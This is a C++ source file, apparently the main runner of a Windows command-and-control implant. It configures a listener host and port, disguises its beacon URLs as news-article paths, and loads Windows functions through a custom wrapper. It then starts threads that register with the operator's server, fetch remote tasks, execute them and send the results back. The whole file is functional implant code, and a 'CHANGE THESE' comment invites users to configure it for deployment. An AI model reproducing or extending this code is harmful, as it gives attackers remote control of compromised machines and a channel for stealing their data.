#include <Windows.h>
#include "utils/buffer.h"
#include "utils/winapi.h"
#include "runner/runner.h"
#include "communicators/base.h"
#include "communicators/http.h"
#include "utils/random.h"
#include "utils/queue.h"
#include "utils/event.h"
#include "executor/executor.h"

/* Entry point */
void Runner::Run()
{
    try
    {
        // Configurable stuff - CHANGE THESE
        const CHAR host[] = "kali";
        const DWORD port = 8080;
        const CHAR urlPathChoices[] = "/politics/congress-investigates-allegations-of-foreign-interference\x00/politics/new-study-reveals-stark-disparities-in-healthcare-access\x00";
        const DWORD communicationIntervalSecs = 10;
        const DWORD registrationWaitSecs = 3000;
        const DWORD executorIntervalSecs = 5;

        // For WinAPI stuff
        WinApiCustom winApiCustom = WinApiCustom();

        // Setup events
        Event eventRegister = Event(&winApiCustom);        // Tracks agent registration with Listener
        Event eventAgentShouldStop = Event(&winApiCustom); // Tracks if agent should stop

        // Setup Task Input and Output queues
        Queue TaskInputQueue = Queue(&winApiCustom, TRUE);  // Tasks from Listener are stored here
        Queue TaskOutputQueue = Queue(&winApiCustom, TRUE); // Outputs from tasks execution are stored here

        // Generate and set Agent ID
        RandomGenerator randomGenerator = RandomGenerator(&winApiCustom);
        PCHAR pAgentId = (PCHAR)winApiCustom.HeapAllocCustom(7); // 6 characters + 1 null-byte
        if (pAgentId == NULL)
            goto CLEANUP;
        randomGenerator.GenerateRandomStr(6, pAgentId);

        // Start Communicator thread
        HttpCommunicatorThreadArgs httpCommunicatorThreadArgs;
        httpCommunicatorThreadArgs.agentId = pAgentId;
        httpCommunicatorThreadArgs.listenerHost = (PCHAR)host;
        httpCommunicatorThreadArgs.listenerPort = port;
        httpCommunicatorThreadArgs.pUrlPathChoices = (PCHAR)urlPathChoices;
        httpCommunicatorThreadArgs.pWinApiCustom = &winApiCustom;
        httpCommunicatorThreadArgs.pTaskInputQueue = &TaskInputQueue;
        httpCommunicatorThreadArgs.pTaskOutputQueue = &TaskOutputQueue;
        httpCommunicatorThreadArgs.pEventRegister = &eventRegister;
        httpCommunicatorThreadArgs.pEventAgentShouldStop = &eventAgentShouldStop;
        httpCommunicatorThreadArgs.communicationIntervalMs = communicationIntervalSecs * 1000;

        HANDLE hThreadCommunicator = winApiCustom.CreateThreadCustom(
            (LPTHREAD_START_ROUTINE)(HttpCommunicator::StartCommunicatorThread),
            &httpCommunicatorThreadArgs);
        if (hThreadCommunicator == NULL)
            goto CLEANUP;

        // Start Executor thread
        StartExecutorThreadParameters executorParameters;
        executorParameters.pEventRegister = &eventRegister;
        executorParameters.pTaskInputQueue = &TaskInputQueue;
        executorParameters.pTaskOutputQueue = &TaskOutputQueue;
        executorParameters.pWinApiCustom = &winApiCustom;
        executorParameters.pEventAgentShouldStop = &eventAgentShouldStop;
        executorParameters.waitTimeForRegistrationMs = registrationWaitSecs * 1000;
        executorParameters.agentId = pAgentId;
        executorParameters.executorIntervalMs = executorIntervalSecs * 1000;

        HANDLE hThreadExecutor = winApiCustom.CreateThreadCustom(
            (LPTHREAD_START_ROUTINE)(Executor::StartExecutorThread),
            &executorParameters);
        if (hThreadExecutor == NULL)
            goto CLEANUP;

        // Wait for all threads to close, then close their handles
        winApiCustom.loadedFunctions.WaitForSingleObject(hThreadExecutor, INFINITE);
        winApiCustom.loadedFunctions.CloseHandle(hThreadExecutor);
        hThreadExecutor = NULL;

        winApiCustom.loadedFunctions.WaitForSingleObject(hThreadCommunicator, INFINITE);
        winApiCustom.loadedFunctions.CloseHandle(hThreadCommunicator);
        hThreadCommunicator = NULL;

    CLEANUP:
        // Set event so that agent closes
        eventAgentShouldStop.Set();

        // Free heap for Agent ID
        if (pAgentId != NULL)
            winApiCustom.HeapFreeCustom(pAgentId);

        // Close open threads
        if (hThreadExecutor != NULL)
        {
            winApiCustom.loadedFunctions.WaitForSingleObject(hThreadExecutor, INFINITE);
            winApiCustom.loadedFunctions.CloseHandle(hThreadExecutor);
        }
        if (hThreadCommunicator != NULL)
        {
            winApiCustom.loadedFunctions.WaitForSingleObject(hThreadCommunicator, INFINITE);
            winApiCustom.loadedFunctions.CloseHandle(hThreadCommunicator);
        }
    }
    catch (...)
    {
        return;
    }
}